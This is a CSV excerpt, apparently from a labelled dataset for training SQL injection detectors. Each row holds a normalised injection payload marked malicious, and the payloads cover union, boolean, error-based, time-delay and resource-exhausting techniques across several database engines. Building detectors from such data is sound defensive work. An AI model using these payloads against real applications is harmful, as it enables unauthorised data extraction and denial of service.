row_index,payload_norm,label,sqli_type_hint
9630,select ( case when ( 1014 = 4280 ) then 1014 else 1014* ( select 1014 from mysql.db ) end ) #,1,
9631,-5769 ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ),1,
9632,"1%"" ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""%"" = """,1,
9633,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
9634,"-5526 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
9635,"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""endx"" = ""endx",1,
9636,1 ) ) as dhqt where 8485 = 8485 waitfor delay '0:0:5'--,1,
9637,"-1059"" ) union all select 1276,1276,1276,1276,1276,1276,1276,1276#",1,
9638,"-3377"" ) or 4982 = 6608#",1,
9639,"-7676"" ) ) as flov where 7967 = 7967 union all select 7967--",1,
9640,1' rlike ( select ( case when ( 1916 = 7874 ) then 1 else 0x28 end ) ) and 'ughq' = 'ughq,1,
9641,"-1630' union all select 1971,1971--",1,
9642,"1 ) as mwcs where 2544 = 2544 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,
9643,"-6436' in boolean mode ) union all select 7589,7589,7589,7589--",1,
9644,1'+ ( select 'ozpm' where 6939 = 6939 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) ) +',1,
9645,"1"" where 3318 = 3318",1,
9646,"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'ukxj' = 'ukxj",1,
9647,"1 ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
9648,"1' ) ) union all select null,null,null,null#",1,
9649,"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'fvbv' = 'fvbv",1,
9650,1' ) as jwch where 4609 = 4609,1,
9651,1 ) as afmb where 8665 = 8665 order by 1#,1,
9652,"-7107"" ) ) ) order by 1#",1,
9653,1' ) where 2511 = 2511 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1,
9654,"1"" and elt ( 4594 = 1040,1040 )",1,
9655,-6764' ) or 2314 = 2017--,1,
9656,1 ) as iiku where 9466 = 9466,1,
9657,1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),1,
9658,-9847%' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( '%' = ',1,
9659,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh' = 'vhvh",1,
